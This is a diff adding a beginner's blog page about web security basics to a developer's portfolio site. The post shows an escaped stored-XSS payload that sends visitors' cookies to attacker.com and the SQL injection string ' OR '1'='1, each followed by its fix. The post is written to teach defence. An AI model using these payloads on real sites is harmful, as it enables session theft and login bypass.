@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>My Journey in Cybersecurity Basics | Dennis Fundi</title>
+    
+    <!-- Fonts & Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        .blog-page {
+            padding-top: 120px;
+            padding-bottom: 80px;
+            min-height: 100vh;
+        }
+        .blog-article {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 3rem;
+            max-width: 800px;
+            margin: 0 auto;
+            backdrop-filter: blur(var(--glass-blur));
+        }
+        .article-header {
+            margin-bottom: 2.5rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+        }
+        .article-tag {
+            display: inline-block;
+            background: rgba(20, 184, 166, 0.1);
+            color: var(--accent-primary);
+            padding: 0.4rem 1rem;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            font-weight: 500;
+        }
+        .article-title {
+            font-size: clamp(2rem, 5vw, 2.8rem);
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+        .article-meta {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            display: flex;
+            gap: 1.5rem;
+        }
+        .article-body {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+        }
+        .article-body h2 {
+            font-size: 1.8rem;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+        .article-body p {
+            margin-bottom: 1.5rem;
+            line-height: 1.8;
+        }
+        .code-block {
+            background: #0f172a;
+            padding: 1.5rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            margin: 2rem 0;
+            color: #e2e8f0;
+        }
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        .back-link:hover {
+            color: var(--accent-primary);
+        }
+        
+        @media (max-width: 768px) {
+            .blog-article { padding: 1.5rem; }
+        }
+    </style>
+  </head>
+  <body>
+    <div class="cursor-glow"></div>
+
+    <!-- Nav (Simplified) -->
+    <nav class="navbar">
+        <div class="container nav-container">
+            <a href="index.html" class="logo">Dennis<span class="highlight">.</span></a>
+            <a href="index.html#blog" class="back-link" style="margin: 0;">&larr; Back to Portfolio</a>
+        </div>
+    </nav>
+
+    <section class="blog-page">
+        <div class="container">
+            <article class="blog-article fade-in">
+                <header class="article-header">
+                    <span class="article-tag">Cybersecurity</span>
+                    <h1 class="article-title">My Journey into the Basics of Web Security</h1>
+                    <div class="article-meta">
+                        <span><i class="fa-regular fa-calendar"></i> January 2026</span>
+                        <span><i class="fa-regular fa-clock"></i> 4 min read</span>
+                    </div>
+                </header>
+                
+                <div class="article-body">
+                    <p>
+                        As a web developer, it is easy to get lost in making things look good and forget about making them safe. 
+                        My interest in cybersecurity started when I learned just how easy it is to break a website that trusts user input blindly.
+                    </p>
+                    
+                    <h2>Never Trust the User</h2>
+                    <p>
+                        The golden rule I learned is: <strong>Never trust input from the client.</strong> 
+                        I used to think, "Why would a user type a script tag into a search bar?" 
+                        The answer is: because they can, and malicious actors will.
+                    </p>
+
+                    <h2>Understanding XSS (Cross-Site Scripting)</h2>
+                    <p>
+                        I was shocked to learn about Stored XSS. If I build a comment section and just render the text raw, someone could post:
+                    </p>
+                    <div class="code-block">
+&lt;script&gt;
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+                    </div>
+                    <p>
+                        If my website renders this, every visitor who sees that comment basically hands over their session cookies to the attacker. 
+                        The fix? Always escape HTML entities or use libraries that sanitize input automatically (like React does by default, or libraries like DOMPurify).
+                    </p>
+
+                    <h2>SQL Injection: The Classic</h2>
+                    <p>
+                        I also delved into SQL Injection (SQLi). It's terrifying how a simple login form can be bypassed with `' OR '1'='1`.
+                        This taught me to <strong>always use parameterized queries</strong> or an ORM/ODM (like Mongoose for MongoDB) rather than concatenating strings to build database queries.
+                    </p>
+                    
+                    <h2>Conclusion</h2>
+                    <p>
+                        Learning these basics didn't just make me paranoid; it made me a better developer. 
+                        Security isn't an afterthought or a "feature" you add at the end—it has to be baked into how you think about data flow from day one.
+                    </p>
+                </div>
+            </article>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container text-center">
+            <p>&copy; 2026 Dennis Fundi Kamau. Built with care.</p>
+        </div>
+    </footer>
+
+    <script src="main.js"></script>
+  </body>
+</html>
